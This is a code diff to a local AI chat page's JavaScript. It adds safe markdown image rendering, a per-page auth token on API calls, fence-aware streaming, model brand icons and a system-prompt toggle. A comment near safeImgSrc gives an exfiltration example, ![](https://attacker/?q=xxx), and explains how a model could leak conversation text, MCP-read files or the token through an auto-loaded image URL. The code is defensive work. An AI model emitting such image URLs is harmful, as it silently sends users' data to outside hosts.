@@ -153,6 +153,8 @@ var INLINE_SRC = [
   "~~([\\s\\S]+?)~~",
   "(?<![\\w*])\\*([^*\\n]+)\\*(?![\\w*])",
   "(?<![\\w])_([^_\\n]+)_(?![\\w])",
+  // 图片必须排在链接前面，否则 "![alt](url)" 会先被链接规则吃掉，只留下一个孤零零的 "!"
+  "!\\[([^\\]\\n]*)\\]\\(([^()\\s]+)\\)",
   "\\[([^\\]\\n]+)\\]\\(([^()\\s]+)\\)"
 ].join("|");
 
@@ -161,6 +163,32 @@ function safeHref(raw) {
   if (!url) return "";
   if (/^(https?:\/\/|mailto:)/i.test(url)) return url;
   return "";
+}
+
+// 图片地址：只放 base64 的 data URI。
+//
+// 不能放远程 URL：markdown 里的 ![](https://attacker/?q=xxx) 会让页面在渲染回复的
+// 那一瞬间就去请求它。模型可以把对话内容、MCP 工具读到的文件内容甚至页面 token
+// 拼进这个 URL，用户什么都没点，数据就已经出去了。这个页面还跑着用户的 MCP 工具，
+// 工具结果能反过来喂给模型，风险比普通聊天页大得多。
+function safeImgSrc(raw) {
+  var url = String(raw || "").trim();
+  if (!url) return "";
+  if (/^data:image\/(png|jpe?g|gif|webp|avif|svg\+xml);base64,/i.test(url)) return url;
+  return "";
+}
+
+// 远程图片不自动加载，只给一个用户主动点的链接
+function remoteImgLink(raw, alt) {
+  const url = safeHref(raw);
+  if (!url) return null;
+  return el("a", {
+    class: "md-img-link",
+    href: url,
+    target: "_blank",
+    rel: "noreferrer noopener",
+    text: "图片：" + (alt || url) + "（点击打开）",
+  });
 }
 
 function appendText(parent, text) {
@@ -192,11 +220,34 @@ function inlineInto(parent, text) {
       var em = el("em");
       inlineInto(em, m[6] !== undefined ? m[6] : m[7]);
       parent.appendChild(em);
-    } else if (m[9] !== undefined) {
-      var href = safeHref(m[9]);
+    } else if (m[8] !== undefined) {
+      // 图片：![alt](url)
+      var imgSrc = safeImgSrc(m[9]);
+      if (!imgSrc) {
+        // 远程图片不自动加载，给一个用户主动点的链接
+        var imgLink = remoteImgLink(m[9], m[8]);
+        if (imgLink) parent.appendChild(imgLink);
+        else appendText(parent, m[0]);
+      } else {
+        var img = el("img", { class: "md-img", src: imgSrc, alt: m[8] || "", loading: "lazy" });
+        (function (src2, alt2) {
+          img.addEventListener("click", function () { lightbox(src2, alt2); });
+          img.addEventListener("error", function () {
+            // 加载不出来就换成一行可点的链接，别在正文里留个破图标
+            var fail = el("span", { class: "md-img-fail" },
+              el("span", { text: "图片加载失败：" }),
+              el("a", { href: safeHref(src2), target: "_blank", rel: "noreferrer noopener", text: src2 })
+            );
+            if (img.parentNode) img.parentNode.replaceChild(fail, img);
+          });
+        })(imgSrc, m[8] || "");
+        parent.appendChild(img);
+      }
+    } else if (m[10] !== undefined) {
+      var href = safeHref(m[11]);
       if (href) {
         var a = el("a", { href: href, target: "_blank", rel: "noreferrer noopener" });
-        inlineInto(a, m[8]);
+        inlineInto(a, m[10]);
         parent.appendChild(a);
       } else {
         appendText(parent, m[0]);
@@ -274,11 +325,32 @@ function parseListBlock(lines, start) {
      - 尾巴是纯文本，每帧只改 textContent —— 不再每帧清空重建整个 DOM
    以前的写法每帧 renderMarkdown 全量重建，文字节点被反复替换、排版反复重算，
    看上去就是一直抽搐。 */
+// 找最后一个"不在代码围栏里"的空行，用来切稳定段和尾巴。
+// 只按最后一个 \n\n 切的话，代码块里一旦有空行，稳定段就会以未闭合的
+// \`\`\` 结尾，流式期间那块代码会被当普通段落渲染，到 finish 才跳回代码块。
+function lastSafeBreak(text) {
+  var idx = -1;
+  var inFence = false;
+  var lineStart = 0;
+  for (var i = 0; i <= text.length; i++) {
+    if (i !== text.length && text[i] !== "\n") continue;
+    var line = text.slice(lineStart, i);
+    if (/^\s*(`{3,}|~{3,})/.test(line)) {
+      inFence = !inFence;
+    } else if (!inFence && line === "" && i > 0 && i < text.length) {
+      idx = i + 1; // 切在这个空行之后（含换行）
+    }
+    lineStart = i + 1;
+  }
+  return idx;
+}
+
 function renderStreaming(container, source) {
   var text = cleanText(source || "");
-  var cut = text.lastIndexOf("\n\n");
-  var stable = cut >= 0 ? text.slice(0, cut + 2) : "";
-  var tail = cut >= 0 ? text.slice(cut + 2) : text;
+  var cut = lastSafeBreak(text);
+  // lastSafeBreak 返回的位置已经包含空行的换行，这里不再 +2（旧代码是按 lastIndexOf 的偏移写的）
+  var stable = cut >= 0 ? text.slice(0, cut) : "";
+  var tail = cut >= 0 ? text.slice(cut) : text;
 
   var stableEl = container.firstChild && container.firstChild.classList && container.firstChild.classList.contains("md-stable")
     ? container.firstChild : null;
@@ -534,11 +606,33 @@ function toast(text, isError) {
 
 /* ================= HTTP ================= */
 
+/* 服务给这个页面的口令（写在 HTML 的 meta 里），每个 api 请求都带上：
+   别的页面也能发 Origin: null 的请求，口令才说明请求来自这个页面。 */
+var TOKEN = (function () {
+  var m = document.querySelector('meta[name="magpie-chat-token"]');
+  return m ? m.getAttribute("content") || "" : "";
+})();
+
+function authHeaders(extra) {
+  var h = Object.assign({}, extra || {});
+  h["x-magpie-chat-token"] = TOKEN;
+  return h;
+}
+
+/* 服务重启过，口令就换了：重新载入一次页面拿新的（只试一次） */
+var reloaded = false;
+function reloadForToken(res, data) {
+  if (res.status === 403 && data && data.reload && !reloaded) {
+    reloaded = true;
+    try { location.reload(); } catch (e) { /* 载不了就把错误露出来 */ }
+  }
+}
+
 function api(path, options) {
   var opts = options || {};
-  var init = { method: opts.method || "GET", credentials: "omit", cache: "no-store" };
+  var init = { method: opts.method || "GET", credentials: "omit", cache: "no-store", headers: authHeaders() };
   if (opts.body !== undefined) {
-    init.headers = { "content-type": "application/json" };
+    init.headers = authHeaders({ "content-type": "application/json" });
     init.body = JSON.stringify(opts.body);
   }
   if (opts.signal) init.signal = opts.signal;
@@ -547,6 +641,7 @@ function api(path, options) {
       var data = null;
       if (text) { try { data = JSON.parse(text); } catch (e) { data = null; } }
       if (!res.ok) {
+        reloadForToken(res, data);
         var msg = (data && (data.error || data.message)) || text.slice(0, 240) || ("HTTP " + res.status);
         throw new Error(msg);
       }
@@ -578,9 +673,9 @@ function parseEventBlock(block) {
 }
 
 function streamChat(payload, onEvent, signal) {
-  return fetch("/api/chat", {
+  return fetch("api/chat", {
     method: "POST",
-    headers: { "content-type": "application/json" },
+    headers: authHeaders({ "content-type": "application/json" }),
     body: JSON.stringify(payload),
     credentials: "omit",
     cache: "no-store",
@@ -589,7 +684,9 @@ function streamChat(payload, onEvent, signal) {
     if (!res.ok) {
       return res.text().then(function (text) {
         var msg = text.slice(0, 300);
-        try { var parsed = JSON.parse(text); msg = parsed.error || msg; } catch (e) { /* 原样 */ }
+        var parsed = null;
+        try { parsed = JSON.parse(text); msg = parsed.error || msg; } catch (e) { /* 原样 */ }
+        reloadForToken(res, parsed);
         throw new Error("请求失败：" + (msg || res.status));
       });
     }
@@ -651,7 +748,7 @@ function patchSettings(patch) {
 
 function flushSettings() {
   if (saveTimer) { clearTimeout(saveTimer); saveTimer = null; }
-  return api("/api/settings", { method: "POST", body: state.settings }).then(function (saved) {
+  return api("api/settings", { method: "POST", body: state.settings }).then(function (saved) {
     state.settings = Object.assign({}, state.settings, saved || {});
   }).catch(function (err) {
     toast("设置保存失败：" + err.message, true);
@@ -664,6 +761,7 @@ function applySettings(raw) {
     model: String(s.model || ""),
     effort: String(s.effort || ""),
     system: String(s.system || ""),
+    systemEnabled: s.systemEnabled !== false,
     instructions: Array.isArray(s.instructions) ? s.instructions.slice() : [],
     skills: Array.isArray(s.skills) ? s.skills.slice() : [],
     mcp: Array.isArray(s.mcp) ? s.mcp.slice() : [],
@@ -683,9 +781,20 @@ function applySettings(raw) {
 
 function renderPills() {
   var model = currentModel();
-  $("#modelValue").textContent = state.models.length ? modelLabel(model) : "无可用模型";
+  // 选了模型并且能在列表里找到，才算"已选"；否则按钮显示"选择模型"
+  var hasModel = Boolean(state.settings.model && model);
+  var ico = $("#modelIco");
+  while (ico.firstChild) ico.removeChild(ico.firstChild);
+  if (hasModel) {
+    var logo = modelLogo(modelBrandIcon(model.id, model.provider));
+    if (logo) { ico.appendChild(logo); ico.hidden = false; }
+    else ico.hidden = true;
+  } else {
+    ico.hidden = true;
+  }
+  $("#modelValue").textContent = hasModel ? modelLabel(model) : "选择模型";
   $("#modelBtn").disabled = !state.models.length;
-  $("#modelBtn").classList.toggle("on", Boolean(state.settings.model));
+  $("#modelBtn").classList.toggle("on", hasModel);
 
   var efforts = (model && Array.isArray(model.efforts)) ? model.efforts : [];
   $("#effortValue").textContent = state.settings.effort ? effortLabel(state.settings.effort) : "默认";
@@ -712,7 +821,9 @@ function renderModelPop() {
   }
   state.models.forEach(function (m) {
     var cur = m.id === state.settings.model;
+    // 每个模型左边一个品牌图标（OpenAI / Claude / DeepSeek…）
     var item = el("button", { class: "pop-item" + (cur ? " sel" : ""), type: "button", role: "menuitem", title: m.id },
+      modelLogo(modelBrandIcon(m.id, m.provider)),
       el("span", { class: "v", text: modelLabel(m) }),
       el("span", { class: "n", text: [m.provider || "", m.reasoning ? "可思考" : ""].filter(Boolean).join(" · ") || m.id }),
       cur ? el("span", { class: "check", text: "\u2713" }) : null
@@ -875,7 +986,7 @@ function addFiles(files) {
       return null;
     }
     return readAsDataURL(file).then(function (data) {
-      return api("/api/upload", {
+      return api("api/upload", {
         method: "POST",
         body: { name: file.name || "file", type: type, data: data, clientType: type }
       }).catch(function () {
@@ -1068,7 +1179,7 @@ function bindResizers() {
       var w = Math.round(target.getBoundingClientRect().width);
       var key = WIDTHS[cfg[1]].key;
       state.settings[key] = w;
-      api("/api/settings", { method: "POST", body: { [key]: w } }).catch(function () {});
+      api("api/settings", { method: "POST", body: { [key]: w } }).catch(function () {});
     }
 
     bar.addEventListener("mousedown", down);
@@ -1084,7 +1195,7 @@ function bindResizers() {
       target.style.setProperty(cfg[1] === "left" ? "--side-w" : "--set-w", next + "px");
       var key = WIDTHS[cfg[1]].key;
       state.settings[key] = next;
-      api("/api/settings", { method: "POST", body: { [key]: next } }).catch(function () {});
+      api("api/settings", { method: "POST", body: { [key]: next } }).catch(function () {});
     });
   });
 }
@@ -1109,7 +1220,7 @@ function toggleSettings(open, persist) {
   state.settings.settingsOpen = show;
   // 恢复上次状态时不要再写回去，否则会把用户刚改的值覆盖成旧的
   if (persist !== false) {
-    api("/api/settings", { method: "POST", body: { settingsOpen: show } }).catch(function () {});
+    api("api/settings", { method: "POST", body: { settingsOpen: show } }).catch(function () {});
   }
   if (show) renderSettings();
 }
@@ -1125,6 +1236,7 @@ function renderSettings() {
   $("#maxTokens").value = String(state.settings.maxTokens || 0);
   $("#showReasoning").setAttribute("aria-checked", state.settings.showReasoning ? "true" : "false");
   $("#syncWidth").setAttribute("aria-checked", state.settings.syncWidth ? "true" : "false");
+  $("#systemEnabled").setAttribute("aria-checked", state.settings.systemEnabled !== false ? "true" : "false");
   renderSetList("#instructionList", state.library.instructions || [], "instructions", function (item) {
     return { key: item.id || item.name, name: item.name || item.id, extra: item.size ? item.size + " B" : "" };
   });
@@ -1177,7 +1289,7 @@ function checkTools() {
   status.textContent = "检查中…";
   status.className = "set-tools-status";
   $("#checkTools").disabled = true;
-  api("/api/mcp/tools").then(function (data) {
+  api("api/mcp/tools").then(function (data) {
     var servers = (data && data.servers) || [];
     if (!servers.length) { status.textContent = "没有启用的服务器"; return; }
     var ok = servers.filter(function (s) { return s.ok; });
@@ -1200,7 +1312,7 @@ function checkTools() {
 /* ================= 会话列表 ================= */
 
 function loadConversations() {
-  return api("/api/conversations").then(function (data) {
+  return api("api/conversations").then(function (data) {
     state.conversations = (data && data.items) || [];
     renderSessions();
   }).catch(function (err) {
@@ -1284,7 +1396,7 @@ function togglePin(id, pin) {
   if (pin && at < 0) pinned.push(id);
   if (!pin && at >= 0) pinned.splice(at, 1);
   state.settings.pinned = pinned;
-  api("/api/settings", { method: "POST", body: { pinned: pinned } })
+  api("api/settings", { method: "POST", body: { pinned: pinned } })
     .then(function () { return loadConversations(); })
     .then(function () { toast(pin ? "已置顶" : "已取消置顶"); })
     .catch(function (err) { toast("置顶失败：" + err.message, true); });
@@ -1307,7 +1419,10 @@ function startRename(id, rowEl, oldTitle) {
     if (input.parentNode) input.parentNode.removeChild(input);
     rowEl.style.display = "";
     if (!save || !val || val === oldTitle) return;
-    api("/api/conversations/" + encodeURIComponent(id), { method: "PATCH", body: { title: val } })
+    // 正在看的就是这一条：本地标题也要跟着改，否则下一次 persistConversation
+    // 会把旧的 state.title 整份 POST 回去，刚改的名字又被盖掉。
+    if (id === state.convId) state.title = val;
+    api("api/conversations/" + encodeURIComponent(id), { method: "PATCH", body: { title: val } })
       .then(function () { return loadConversations(); })
       .catch(function (err) { toast("重命名失败：" + err.message, true); });
   }
@@ -1324,11 +1439,11 @@ function startRename(id, rowEl, oldTitle) {
 function askDelete(id, title) {
   var name = String(title || "这条对话");
   {
-    api("/api/conversations/" + encodeURIComponent(id), { method: "DELETE" }).then(function () {
+    api("api/conversations/" + encodeURIComponent(id), { method: "DELETE" }).then(function () {
       // 置顶列表里也把它去掉，免得留下悬空的 id
       var pinned = (state.settings.pinned || []).filter(function (x) { return x !== id; });
       state.settings.pinned = pinned;
-      api("/api/settings", { method: "POST", body: { pinned: pinned } }).catch(function () {});
+      api("api/settings", { method: "POST", body: { pinned: pinned } }).catch(function () {});
       if (state.convId === id) {
         state.convId = null;
         state.title = "新对话";
@@ -1349,13 +1464,13 @@ function askDelete(id, title) {
 function setSidebar(open) {
   $("#app").classList.toggle("side-off", !open);
   state.settings.sidebar = open;
-  api("/api/settings", { method: "POST", body: { sidebar: open } }).catch(function () {});
+  api("api/settings", { method: "POST", body: { sidebar: open } }).catch(function () {});
 }
 
 function openConversation(id) {
   if (state.busy) { toast("正在生成，先停止再切换对话", true); return; }
   dropBlankDraft(); // 切换到别的对话时，空着的"新对话"不该留在列表里
-  api("/api/conversations/" + encodeURIComponent(id)).then(function (conv) {
+  api("api/conversations/" + encodeURIComponent(id)).then(function (conv) {
     if (!conv) return;
     state.convId = conv.id;
     state.title = conv.title || "新对话";
@@ -1414,7 +1529,7 @@ function persistConversation() {
       };
     })
   };
-  return api("/api/conversations", { method: "POST", body: payload }).then(function (saved) {
+  return api("api/conversations", { method: "POST", body: payload }).then(function (saved) {
     if (!saved) return;
     state.convId = saved.id;
     state.title = saved.title || state.title;
@@ -1551,23 +1666,29 @@ function renderMessages() {
     box.appendChild(emptyState());
     return;
   }
-  state.messages.forEach(function (msg) { box.appendChild(buildTurn(msg).root); });
+  var lastAssistant = null;
+  state.messages.forEach(function (msg) {
+    var refs = buildTurn(msg);
+    box.appendChild(refs.root);
+    if (msg.role === "assistant") lastAssistant = refs;
+  });
+  showLatestForage(lastAssistant);
+}
+
+// 只有最新一轮显示"觅食"状态，翻回去看历史时不重复
+function showLatestForage(refs) {
+  var all = document.querySelectorAll("#stream .turn-forage");
+  for (var i = 0; i < all.length; i++) all[i].hidden = true;
+  if (!refs || !refs.msg) return;
+  var m = refs.msg;
+  if (m.error) paintTurnForage(refs, "fail", "Magpie没有找到食物", null);
+  else if (m.forageMs || m.ms) paintTurnForage(refs, "done", "Magpie找到了食物！", m.forageMs || m.ms);
 }
 
 function emptyState() {
-  var sugs = ["用一句话说说 magpie chat 能做什么", "帮我写个 PowerShell 批量重命名脚本", "把这段函数拆成三个小函数"];
   return el("div", { class: "empty-state" },
     el("b", { text: "开始一段对话" }),
-    el("p", { text: "模型和思考强度在输入框右下角；历史对话在左侧，可以收起。" }),
-    el("div", { class: "empty-sugs" }, sugs.map(function (text) {
-      return el("button", { class: "sug", type: "button", text: text, onclick: function () {
-        var input = $("#input");
-        input.value = text;
-        autoGrow();
-        updateSend();
-        input.focus();
-      } });
-    }))
+    el("p", { text: "模型和思考强度在输入框右下角；历史对话在左侧，可以收起。" })
   );
 }
 
@@ -1586,6 +1707,57 @@ function modelIconFor(msg) {
   var id = msg && msg.model;
   var hit = id ? (state.models || []).find(function (m) { return m.id === id; }) : currentModel();
   return hit && hit.icon ? hit.icon : "";
+}
+
+/* ---------- 模型品牌图标 ----------
+   图标取自 @lobehub/icons 的静态 SVG 集合，放在 chat/icons/models/。
+   模型 id 和供应商名没有统一规范，所以用关键词猜品牌；猜不到就退回
+   供应商图标（modelIconFor）。图标是单色的，用 mask 上色，跟着主题走。 */
+var MODEL_BRANDS = [
+  // (?:^|[/_-]) 是因为模型 id 常带 group/ 前缀，只写 ^ 会匹配不到 group/o3-mini
+  [/chatgpt|gpt|(?:^|[/_-])o[1345](?!\d)|openai/i, "openai"],
+  [/claude|anthropic/i, "claude"],
+  [/gemini|google|palm|brad/i, "google"],
+  [/deepseek/i, "deepseek"],
+  [/qwen|tongyi|qianwen|dashscope/i, "qwen"],
+  [/kimi|moonshot/i, "kimi"],
+  [/glm|chatglm|zhipu/i, "zhipu"],
+  [/minimax|abab/i, "minimax"],
+  [/mimo|xiaomi/i, "xiaomimimo"],
+  [/cohere|command-r/i, "cohere"],
+  [/mistral|mixtral|codestral/i, "mistral"],
+  [/llama|meta-/i, "meta"],
+  [/grok/i, "grok"],
+  [/xai/i, "xai"],
+  [/copilot|phi-/i, "microsoft"],
+  [/nvidia|nemotron/i, "nvidia"],
+  [/ernie|wenxin|baidu/i, "baidu"],
+  [/doubao|bytedance|seed-/i, "bytedance"],
+  [/sensenova|sense-nova/i, "sensenova"],
+  [/^yi-|01-ai/i, "yi"],
+  [/baichuan/i, "baichuan"],
+  [/groq/i, "groq"]
+];
+
+function modelBrandIcon(idOrMsg, provider) {
+  var id = typeof idOrMsg === "string" ? idOrMsg : (idOrMsg && idOrMsg.model) || "";
+  var hay = String(id) + " " + String(provider || "");
+  for (var i = 0; i < MODEL_BRANDS.length; i++) {
+    if (MODEL_BRANDS[i][0].test(hay)) return MODEL_BRANDS[i][1];
+  }
+  return "";
+}
+
+// 品牌图标节点：一个用 mask 上色的 span，颜色跟随当前文字色
+function modelLogo(brand) {
+  if (!brand) return null;
+  var s = el("span", { class: "model-logo", "aria-hidden": "true" });
+  var url = 'url("icons/models/' + brand + '.svg")';
+  try {
+    s.style.webkitMaskImage = url;
+    s.style.maskImage = url;
+  } catch (e) { /* 老浏览器没有 mask 就不显示 */ }
+  return s;
 }
 
 // 一条消息里的附件（图片缩略图 / 文件条）
@@ -1703,21 +1875,27 @@ function buildTurn(msg, animate) {
     thinkBody: think.querySelector(".think-body"), talks: talks, cards: cards,
     body: bodyMd, err: err, actions: actions, copy: copy, forage: forage, dirty: false
   };
-  // 老对话（重新打开时）：把当时的结果直接画出来
-  if (msg.error) paintTurnForage(refs, "fail", "Magpie没有找到食物", null);
-  else if (msg.forageMs || msg.ms) paintTurnForage(refs, "done", "Magpie找到了食物！", msg.forageMs || msg.ms);
+  // 觅食状态不在 buildTurn 里画：历史上每一轮都挂一条太吵。
+  // 只在 renderMessages 末尾给最新一轮补上（见 showLatestForage）。
   updateMeta(refs);
   return refs;
 }
 
 // 标签 = 图标 + 模型名；用户轮没有标签
+// 图标优先用模型品牌图标（OpenAI / Claude / DeepSeek…），没有就退回供应商图标
 function updateLabel(refs) {
   var msg = refs.msg;
   var label = refs.label;
   while (label.firstChild) label.removeChild(label.firstChild);
   if (msg.role === "user") return;
-  var icon = modelIconFor(msg);
-  if (icon) label.appendChild(el("img", { src: icon, alt: "" }));
+  var hit = (state.models || []).find(function (m) { return m.id === msg.model; }) || currentModel();
+  var logo = modelLogo(modelBrandIcon(msg, hit && hit.provider));
+  if (logo) {
+    label.appendChild(logo);
+  } else {
+    var icon = modelIconFor(msg);
+    if (icon) label.appendChild(el("img", { src: icon, alt: "" }));
+  }
   var name = turnLabelFor(msg);
   if (name) label.appendChild(el("span", { text: name }));
 }
@@ -2007,7 +2185,7 @@ function send() {
     messages: history,
     model: state.settings.model,
     effort: state.settings.effort || "",
-    system: state.settings.system || "",
+    system: state.settings.systemEnabled === false ? "" : (state.settings.system || ""),
     temperature: Number(state.settings.temperature),
     maxTokens: Number(state.settings.maxTokens) || 0,
     useTools: (state.settings.mcp || []).length > 0,
@@ -2172,6 +2350,11 @@ function forageClearTimers() {
 // 开始：在这一轮消息底部显示"正在觅食ing…"，每秒走一次计时
 function forageBegin(refs) {
   forageClearTimers();
+  // 新一轮开始：把上一轮的提示收掉，只留最新这条
+  var old = document.querySelectorAll("#stream .turn-forage");
+  for (var i = 0; i < old.length; i++) {
+    if (old[i] !== (refs && refs.forage)) old[i].hidden = true;
+  }
   forage.startAt = Date.now();
   forage.refs = refs;
   paintTurnForage(refs, "busy", "Magpie正在觅食ing…", 0);
@@ -2222,8 +2405,9 @@ function finish(refs) {
     refs.think.open = false;
   }
   if (refs.dirty) { refs.dirty = false; renderMarkdown(refs.body, refs.msg.content); }
-  // 流式结束时把"稳定块 + 尾巴"的结构换回一次完整渲染，保证格式正确
-  else if (refs.body && refs.body.querySelector(".md-stable")) renderMarkdown(refs.body, refs.msg.content);
+  // 整段一次到达时，流在一帧内就结束了：那次 pumpTick 一次都没跑过，dirty 还是 false，
+  // 也没有 .md-stable 结构 —— 只判 .md-stable 会让正文一直是空的。有内容就渲染一次。
+  else if (refs.body && refs.msg.content) renderMarkdown(refs.body, refs.msg.content);
   state.liveRefs.delete(refs);
   updateMeta(refs);
   updateSend();
@@ -2241,7 +2425,7 @@ function stop() {
   if (!state.busy) return;
   state.stopped = true;
   var clientId = state.clientId;
-  api("/api/chat/stop", { method: "POST", body: { clientId: clientId, id: clientId } }).catch(function () { /* 断开也会中止 */ });
+  api("api/chat/stop", { method: "POST", body: { clientId: clientId, id: clientId } }).catch(function () { /* 断开也会中止 */ });
   if (state.abort) {
     try { state.abort.abort(); } catch (e) { /* 已结束 */ }
   }
@@ -2384,6 +2568,12 @@ function bindUI() {
     patchSettings({ maxTokens: v });
   });
 
+  $("#systemEnabled").addEventListener("click", function (e) {
+    var on = e.currentTarget.getAttribute("aria-checked") !== "true";
+    e.currentTarget.setAttribute("aria-checked", on ? "true" : "false");
+    patchSettings({ systemEnabled: on });
+  });
+
   $("#showReasoning").addEventListener("click", function (e) {
     var on = e.currentTarget.getAttribute("aria-checked") !== "true";
     e.currentTarget.setAttribute("aria-checked", on ? "true" : "false");
@@ -2408,7 +2598,7 @@ function boot() {
   updateSend();
   renderMessages();
 
-  api("/api/bootstrap").then(function (data) {
+  api("api/bootstrap").then(function (data) {
     state.boot = data || {};
     state.models = (data && data.models) || [];
     state.library = (data && data.library) || { instructions: [], skills: [], mcp: [] };
